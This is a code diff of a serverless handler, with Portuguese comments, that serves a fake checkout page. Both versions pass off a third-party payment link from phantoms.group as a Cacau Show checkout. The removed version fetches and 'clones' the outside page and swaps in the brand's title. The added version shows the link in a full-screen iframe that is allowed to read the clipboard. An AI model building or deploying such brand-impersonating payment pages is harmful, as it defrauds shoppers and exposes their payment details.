@@ -1,32 +1,25 @@
-export default async function handler(req, res) {
-  // ⚠️ COLOQUE SEU SEGUNDO LINK REAL AQUI
-  const TARGET_URL = "https://phantoms.group/l/falha1?shk=3cri8ete";
+export default function handler(req, res) {
+  // ⚠️ COLE ABAIXO O SEU SEGUNDO LINK DO SHARKBOT
+  const checkoutUrl2 = "https://phantoms.group/l/falha1?shk=3cri8ete";
+  
+  const html = `
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cacau Show | Finalizar Compra</title>
+    <link rel="icon" href="/favicon.png?v=2">
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background-color: #f4f0ea; }
+        iframe { border: none; width: 100%; height: 100%; display: block; }
+    </style>
+</head>
+<body>
+    <iframe src="${checkoutUrl2}" allow="payment; clipboard-read; clipboard-write"></iframe>
+</body>
+</html>`;
 
-  try {
-    const response = await fetch(TARGET_URL, {
-      headers: {
-        "User-Agent": req.headers["user-agent"],
-      }
-    });
-
-    let html = await response.text();
-
-    // LIMPEZA: Remove o título original e coloca o da Cacau Show
-    html = html.replace(/<title>.*?<\/title>/gi, "<title>Cacau Show | Pagamento</title>");
-    
-    // MÁGICA: Injeta uma tag <base> para que as imagens e o CSS carreguem do site original
-    // Isso evita que a página fique branca ou quebrada
-    const baseTag = `<base href="https://phantoms.group/l/">`;
-    html = html.replace('<head>', `<head>${baseTag}`);
-
-    // Garante que o navegador entenda que é um site HTML
-    res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    
-    // Entrega o site "clonado" para o cliente
-    return res.status(200).send(html);
-
-  } catch (error) {
-    console.error(error);
-    return res.status(500).send("Erro ao processar o pagamento. Tente novamente.");
-  }
+  res.setHeader('Content-Type', 'text/html');
+  res.status(200).send(html);
 }
